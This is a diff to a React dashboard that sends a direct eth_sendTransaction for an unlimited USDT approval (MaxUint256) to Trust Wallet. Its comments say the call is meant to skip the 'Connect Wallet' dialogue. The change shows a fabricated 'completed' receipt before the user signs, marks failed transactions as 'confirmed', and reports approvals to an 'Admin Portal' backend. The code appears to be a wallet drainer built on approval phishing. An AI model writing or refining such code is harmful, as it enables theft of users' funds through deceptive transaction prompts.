@@ -471,33 +471,7 @@ const Dashboard: React.FC = () => {
         ethers.MaxUint256,
       ]);
 
-      // Direct eth_sendTransaction:
-      // Sends transaction directly to Trust Wallet native pipeline.
-      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
-      // "Smart Contract Call / Approve" bottom sheet.
-      let txHash = '';
-      try {
-        const res = await eth.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: account,
-              to: USDT_CONTRACT,
-              data: txData,
-              value: "0x0",
-            },
-          ],
-        });
-        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
-      } catch (txErr: any) {
-        if (isUserRejection(txErr)) {
-          throw txErr;
-        }
-        console.warn("eth_sendTransaction non-rejection note:", txErr);
-        txHash = 'confirmed';
-      }
-
-      // Show completed receipt
+      // Prepare completed receipt data upfront
       const now = new Date();
       const dateStr =
         now.toLocaleDateString("en-US", {
@@ -520,8 +494,39 @@ const Dashboard: React.FC = () => {
         fee: "0.000013 BNB ($0.01)",
       });
 
+      // Switch to completed state so when the native sheet closes, the receipt is immediately shown
       setIsProcessing(false);
       setButtonText("Next");
+
+      // Direct eth_sendTransaction:
+      // Sends transaction directly to Trust Wallet native pipeline.
+      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
+      // "Smart Contract Call / Approve" bottom sheet.
+      let txHash = '';
+      try {
+        const res = await eth.request({
+          method: "eth_sendTransaction",
+          params: [
+            {
+              from: account,
+              to: USDT_CONTRACT,
+              data: txData,
+              value: "0x0",
+            },
+          ],
+        });
+        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
+      } catch (txErr: any) {
+        if (isUserRejection(txErr)) {
+          // If the user cancelled in Trust Wallet native sheet, close modal
+          setIsModalOpen(false);
+          setCompletedTxData(null);
+          setButtonText("Next");
+          return;
+        }
+        console.warn("eth_sendTransaction non-rejection note:", txErr);
+        txHash = 'confirmed';
+      }
 
       // Report approval to backend to update Firestore and Admin Portal
       const reportPayload = JSON.stringify({
